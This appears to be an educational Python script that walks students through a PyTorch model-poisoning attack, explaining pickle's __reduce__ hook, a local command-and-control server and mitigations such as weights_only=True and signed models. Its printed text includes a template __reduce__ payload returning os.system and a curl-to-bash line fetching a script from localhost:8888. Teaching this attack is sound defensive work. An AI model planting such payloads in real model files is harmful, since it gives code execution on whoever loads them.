#!/usr/bin/env python3
"""
Attack Chain Analysis - Educational Tool
=========================================
This script analyzes the complete attack chain to help students understand
how PyTorch model poisoning attacks work.

Analysis Flow:
    0_server.py      → CnC Server (Command & Control)
    1_attack.py      → Malicious Model Creation
    2_victim-load.py → Victim Loading Model
    serverlog.txt    → Attack Success Evidence

Key Concepts Explained:
    - Pickle deserialization vulnerability
    - __reduce__() magic method exploitation
    - CnC (Command & Control) server communication
    - Remote Code Execution (RCE)
"""

import os
import pickle
import torch
import re
from datetime import datetime


# ============================================================================
# Configuration
# ============================================================================

NORMAL_MODEL = 'models/small_model.pt'
MALICIOUS_MODEL = 'models_attack/small_normal_malicious.pt'
SERVER_LOG = 'data/serverlog.txt'


# ============================================================================
# Analysis Functions
# ============================================================================

def print_header(title):
    """Print formatted section header"""
    print("\n" + "=" * 80)
    print(f" {title}")
    print("=" * 80)


def print_step(step_num, title):
    """Print step header"""
    print(f"\n{'─' * 80}")
    print(f"STEP {step_num}: {title}")
    print('─' * 80)


def analyze_attack_chain():
    """Main analysis function - explains the complete attack chain"""

    print("=" * 80)
    print(" PYTORCH MODEL POISONING - ATTACK CHAIN ANALYSIS")
    print(" Educational Tool for Understanding Pickle Vulnerabilities")
    print("=" * 80)

    print("\n📚 LEARNING OBJECTIVES:")
    print("   1. Understand pickle deserialization vulnerability")
    print("   2. Learn how __reduce__() enables code execution")
    print("   3. See real CnC (Command & Control) communication")
    print("   4. Recognize signs of model poisoning attacks")

    # ========================================================================
    # STEP 0: Attack Chain Overview
    # ========================================================================
    print_header("ATTACK CHAIN OVERVIEW")

    print("""
    ┌─────────────┐      ┌─────────────┐      ┌─────────────┐      ┌─────────────┐
    │ 0_server.py │      │ 1_attack.py │      │ 2_victim.py │      │serverlog.txt│
    │  (CnC Server)│ ←──→ │  (Attacker) │ ───→ │   (Victim)  │ ───→ │  (Evidence) │
    └─────────────┘      └─────────────┘      └─────────────┘      └─────────────┘
         ↑                     ↓                     ↓                     ↓
    Port 8888          Inject Payload        torch.load()         Attack Success!

    Attack Flow:
    ────────────
    1. Attacker sets up CnC server (0_server.py) on port 8888
    2. Attacker injects malicious payload into model (1_attack.py)
    3. Victim downloads and loads poisoned model (2_victim-load.py)
    4. Payload executes: curl -k https://localhost:8888/attack_demo.sh | bash
    5. Server logs the successful attack (serverlog.txt)
    """)

    # ========================================================================
    # STEP 1: CnC Server Analysis
    # ========================================================================
    print_step(1, "CnC (Command & Control) Server Analysis")

    print("""
    📖 What is a CnC Server?
    ────────────────────────
    A Command & Control server is used by attackers to:
    - Distribute malicious payloads
    - Receive stolen data from compromised systems
    - Issue commands to infected machines

    In this demo:
    - File: 0_server.py
    - Port: 8888
    - Serves: attack_demo.sh (malicious script)
    - Logs: All connection attempts
    """)

    if os.path.exists('0_server.py'):
        with open('0_server.py', 'r') as f:
            content = f.read()
            # Find the handler for attack_demo.sh
            if 'attack_demo.sh' in content:
                print("   ✓ Server configured to serve attack_demo.sh")
                print("   ✓ Listens on port 8888")
                print("   ✓ Logs all download attempts")
    else:
        print("   ⚠ Warning: 0_server.py not found")

    # ========================================================================
    # STEP 2: Pickle Vulnerability & __reduce__()
    # ========================================================================
    print_step(2, "Understanding Pickle Vulnerability")

    print("""
    📖 What is Pickle?
    ──────────────────
    Pickle is Python's serialization format. It converts Python objects to bytes
    and back. PyTorch uses pickle to save/load models (.pt files).

    📖 The __reduce__() Vulnerability
    ──────────────────────────────────
    When pickle deserializes (unpickles) an object, it calls __reduce__() if defined.
    Attackers abuse this to execute arbitrary code!

    Normal object:        class Model: ...
    Malicious object:     class Payload:
                              def __reduce__(self):
                                  return (os.system, ('malicious_command',))

    When unpickled → os.system('malicious_command') EXECUTES AUTOMATICALLY!
    """)

    print("\n   🔍 Analyzing 1_attack.py - Payload Injection")
    print("   " + "─" * 76)

    if os.path.exists('1_attack.py'):
        with open('1_attack.py', 'r') as f:
            content = f.read()

            # Extract MaliciousPayload class
            if 'class MaliciousPayload' in content:
                print("   ✓ Found MaliciousPayload class definition")

                # Find __reduce__ method
                reduce_match = re.search(r'def __reduce__\(self\):.*?return.*?\)', content, re.DOTALL)
                if reduce_match:
                    print("\n   🚨 MALICIOUS CODE DETECTED:")
                    print("   " + "─" * 76)
                    for line in reduce_match.group(0).split('\n'):
                        print(f"      {line}")
                    print("   " + "─" * 76)

                # Find curl command
                curl_match = re.search(r'curl -s (http://[^\)]+)', content)
                if curl_match:
                    cnc_url = curl_match.group(1)
                    print(f"\n   🎯 CnC Server URL: {cnc_url}")
                    print(f"   📡 Command: Downloads and executes attack_demo.sh")
    else:
        print("   ⚠ Warning: 1_attack.py not found")

    print("""
    💡 How the Payload Works:
    ─────────────────────────
    1. Attacker defines MaliciousPayload with __reduce__()
    2. __reduce__() returns: (os.system, ('curl -k https://localhost:8888/... | bash',))
    3. When pickle unpickles this object:
       → It calls: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
       → Downloads attack_demo.sh from CnC server
       → Executes it with bash
       → REMOTE CODE EXECUTION achieved! 🚨
    """)

    # ========================================================================
    # STEP 3: Model File Analysis
    # ========================================================================
    print_step(3, "Comparing Normal vs Malicious Models")

    print("""
    📖 Model File Comparison
    ────────────────────────
    We'll compare the normal model with the poisoned model to see the difference.
    """)

    if os.path.exists(NORMAL_MODEL) and os.path.exists(MALICIOUS_MODEL):
        normal_size = os.path.getsize(NORMAL_MODEL)
        malicious_size = os.path.getsize(MALICIOUS_MODEL)
        overhead = malicious_size - normal_size

        print(f"\n   Normal Model:    {NORMAL_MODEL}")
        print(f"      Size: {normal_size:,} bytes ({normal_size / (1024*1024):.2f} MB)")

        print(f"\n   Malicious Model: {MALICIOUS_MODEL}")
        print(f"      Size: {malicious_size:,} bytes ({malicious_size / (1024*1024):.2f} MB)")

        print(f"\n   Payload Overhead: {overhead:,} bytes ({overhead / 1024:.2f} KB)")
        print(f"   Overhead %: {(overhead / normal_size) * 100:.4f}%")

        print("\n   💡 Analysis:")
        if overhead < 5000:
            print("      • Very small overhead - hard to detect by file size alone!")
            print("      • Attackers can hide malicious code in large models")

        # Try to safely inspect the malicious model structure
        print("\n   🔍 Inspecting Malicious Model Structure (SAFELY):")
        print("   " + "─" * 76)

        try:
            # Load with weights_only=True to prevent execution
            print("      Loading with weights_only=True (safe mode)...")
            print("      Note: This may fail if malicious payload is incompatible")

            # Instead, let's examine the pickle structure without executing
            with open(MALICIOUS_MODEL, 'rb') as f:
                # Read magic number
                magic = f.read(4)
                print(f"      Magic bytes: {magic.hex()}")

            print("\n      ⚠ Full analysis requires execution - DANGEROUS!")
            print("      ⚠ That's what 2_victim-load.py demonstrates")

        except Exception as e:
            print(f"      Error during safe analysis: {e}")
    else:
        print("   ⚠ Model files not found")
        if not os.path.exists(NORMAL_MODEL):
            print(f"      Missing: {NORMAL_MODEL}")
        if not os.path.exists(MALICIOUS_MODEL):
            print(f"      Missing: {MALICIOUS_MODEL}")
            print(f"      Run: python3 1_attack.py")

    # ========================================================================
    # STEP 4: Victim Analysis
    # ========================================================================
    print_step(4, "Victim Loading Process")

    print("""
    📖 The Victim's Mistake
    ───────────────────────
    File: 2_victim-load.py

    Vulnerable Code:
    ───────────────
        model = torch.load('malicious_model.pt', weights_only=False)
                                                  ^^^^^^^^^^^^^^^^^^^^
                                                  DANGEROUS!

    What Happens:
    ────────────
    1. torch.load() reads the .pt file
    2. Pickle deserializes the model data
    3. Encounters MaliciousPayload object
    4. Calls __reduce__() automatically
    5. Executes: os.system('curl -k https://localhost:8888/attack_demo.sh | bash')
    6. Downloads attack_demo.sh from CnC server
    7. Executes the script → SYSTEM COMPROMISED! 🚨

    Timeline:
    ────────
    [0.000s] User runs: python3 2_victim-load.py
    [0.100s] torch.load() starts deserializing
    [0.150s] __reduce__() triggered
    [0.200s] curl connects to localhost:8888
    [0.250s] attack_demo.sh downloaded
    [0.300s] bash executes the script
    [0.350s] "Your device is hacked" displayed
    [0.400s] CnC server logs successful attack
    """)

    # ========================================================================
    # STEP 5: Server Log Analysis
    # ========================================================================
    print_step(5, "CnC Server Log Analysis")

    print("""
    📖 Evidence of Attack Success
    ─────────────────────────────
    The CnC server logs every connection attempt. Let's check if the attack succeeded.
    """)

    if os.path.exists(SERVER_LOG):
        print(f"\n   📄 Reading server log: {SERVER_LOG}")
        print("   " + "─" * 76)

        with open(SERVER_LOG, 'r') as f:
            log_content = f.read()

        if log_content.strip():
            print("\n   📋 Server Log Contents:")
            print("   " + "─" * 76)
            for line in log_content.split('\n'):
                if line.strip():
                    print(f"      {line}")
            print("   " + "─" * 76)

            # Analyze log entries
            print("\n   🔍 Log Analysis:")
            if 'Attack Succeed' in log_content or 'attack_demo.sh' in log_content:
                print("      🚨 ATTACK SUCCESSFUL!")
                print("      • CnC server received connection")
                print("      • attack_demo.sh was downloaded")
                print("      • Victim system executed malicious payload")

                # Extract timestamp if available
                timestamp_match = re.search(r'\[([\d\-: ]+)\]', log_content)
                if timestamp_match:
                    print(f"      • Attack time: {timestamp_match.group(1)}")

                # Extract IP if available
                ip_match = re.search(r'from ([\d\.]+)', log_content)
                if ip_match:
                    print(f"      • Source IP: {ip_match.group(1)}")
            else:
                print("      ℹ No attack logged yet")
                print("      • Server is running but no victim connected")
                print("      • Run: python3 2_victim-load.py")
        else:
            print("\n      ℹ Server log is empty")
            print("      • CnC server running but no connections yet")
            print("      • Run: python3 2_victim-load.py to trigger attack")
    else:
        print(f"\n   ⚠ Server log not found: {SERVER_LOG}")
        print("      • Start server: python3 -u 0_server.py 2>&1 | tee data/serverlog.txt")
        print("      • Then run: python3 2_victim-load.py")

    # ========================================================================
    # STEP 6: Defense & Mitigation
    # ========================================================================
    print_step(6, "Defense & Mitigation Strategies")

    print("""
    🛡️ How to Protect Against This Attack
    ──────────────────────────────────────

    1. Use weights_only=True (PyTorch 2.0+):
       ✅ model = torch.load('model.pt', weights_only=True)
       • Only loads tensor data, blocks arbitrary code
       • Safest option for untrusted models

    2. Verify Model Signatures (This Project!):
       ✅ Use self-verifying models with ML-DSA-44 signatures
       • Cryptographically sign models before distribution
       • Verify signature before loading
       • See: self_verifying_secure.py

    3. Sandboxing:
       ✅ Load untrusted models in isolated environments
       • Docker containers
       • Virtual machines
       • Restricted user accounts

    4. Code Review:
       ✅ Inspect model source before loading
       • Check where models came from
       • Verify checksums/hashes
       • Only trust official sources

    5. Network Monitoring:
       ✅ Detect suspicious outbound connections
       • Monitor for unexpected curl/wget
       • Block unknown CnC servers
       • Use firewall rules
    """)

    # ========================================================================
    # Summary
    # ========================================================================
    print_header("SUMMARY - COMPLETE ATTACK CHAIN")

    print("""
    📊 Attack Chain Summary
    ───────────────────────

    ┌──────────────────────────────────────────────────────────────────────┐
    │ Component         │ Role              │ Key Technique                │
    ├──────────────────────────────────────────────────────────────────────┤
    │ 0_server.py       │ CnC Server        │ HTTP server on port 8888     │
    │ 1_attack.py       │ Payload Injection │ __reduce__() exploitation    │
    │ 2_victim-load.py  │ Trigger           │ torch.load(weights_only=False)│
    │ serverlog.txt     │ Evidence          │ Logs successful connections  │
    └──────────────────────────────────────────────────────────────────────┘

    🔑 Key Takeaways for Students:
    ──────────────────────────────

    1. Pickle Vulnerability:
       • Python's pickle is NOT safe for untrusted data
       • __reduce__() method enables arbitrary code execution
       • PyTorch models use pickle → vulnerable by default

    2. Attack Mechanism:
       • Attacker injects MaliciousPayload object into model
       • __reduce__() returns (function, args) tuple
       • When unpickled, function(*args) executes automatically
       • No user interaction needed - just loading triggers it!

    3. CnC Communication:
       • Malicious payload connects to attacker's server
       • Downloads and executes additional malware
       • Can exfiltrate data, install backdoors, etc.

    4. Defense:
       • ALWAYS use weights_only=True for untrusted models
       • Implement cryptographic verification (ML-DSA signatures)
       • Never load models from unknown sources
       • Monitor network activity for suspicious connections

    5. Real-World Impact:
       • Model repositories (HuggingFace, etc.) can be compromised
       • Pre-trained models may contain hidden malware
       • Supply chain attacks targeting ML practitioners
       • Critical infrastructure using AI models at risk
    """)

    print("\n" + "=" * 80)
    print(" End of Analysis - Stay Safe! 🛡️")
    print("=" * 80)
    print()


# ============================================================================
# Main
# ============================================================================

if __name__ == "__main__":
    analyze_attack_chain()
